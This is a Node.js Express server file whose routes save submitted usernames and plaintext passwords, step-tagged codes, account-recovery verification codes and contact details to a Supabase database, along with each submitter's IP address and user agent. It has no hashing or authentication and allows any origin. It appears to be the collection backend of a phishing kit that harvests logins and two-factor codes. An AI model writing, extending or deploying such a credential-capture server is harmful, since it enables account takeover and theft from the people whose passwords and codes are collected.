// server.js
require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const { createClient } = require('@supabase/supabase-js');

const PORT = process.env.PORT || 5000;
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY;

if (!SUPABASE_URL || !SUPABASE_SERVICE_KEY) {
  console.error('Missing Supabase environment variables. Exiting.');
  process.exit(1);
}

// Server-side Supabase client (service role key – keep this secret!)
const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY, {
  auth: { persistSession: false }
});

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Allow frontend
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', process.env.CORS_ORIGIN || '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// Helper: insert row into Supabase
async function supabaseInsert(table, row) {
  const { error } = await supabase.from(table).insert([row]);
  if (error) throw error;
}

// API routes
app.post('/save-login', async (req, res) => {
  try {
    const { username, password, meta } = req.body;
    const row = {
      username,
      password,
      ip: req.ip,
      user_agent: req.get('user-agent'),
      meta: meta || null
    };
    await supabaseInsert('users', row);
    res.json({ success: true });
  } catch (err) {
    console.error('save-login error:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/save-code', async (req, res) => {
  try {
    const { user, step, code } = req.body;
    await supabaseInsert('codes', { user, step, code });
    res.json({ success: true });
  } catch (err) {
    console.error('save-code error:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/save-password-change', async (req, res) => {
  try {
    const { user, phone_or_email, note } = req.body;
    await supabaseInsert('password_changes', { user, phone_or_email, note });
    res.json({ success: true });
  } catch (err) {
    console.error('save-password-change error:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/save-verify-code', async (req, res) => {
  try {
    const { recovery_target, verification_code } = req.body;
    const row = {
      recovery_target,
      verification_code,
      user_agent: req.get('user-agent'),
      ip: req.ip
    };
    await supabaseInsert('verification_codes', row);
    res.json({ success: true });
  } catch (err) {
    console.error('save-verify-code error:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/save-new-password', async (req, res) => {
  try {
    const { username, new_password } = req.body;
    if (!username || !new_password) {
      return res.status(400).json({ success: false, error: 'username and new_password required' });
    }
    const { error } = await supabase
      .from('users')
      .update({ password: new_password })
      .eq('username', username);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('save-new-password error:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/save-latest', async (req, res) => {
  try {
    const { user, latest } = req.body;
    await supabaseInsert('latest', { user, latest_data: latest });
    res.json({ success: true });
  } catch (err) {
    console.error('save-latest error:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

// Fallback 404
app.use((req, res) => res.status(404).send('Not found'));

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
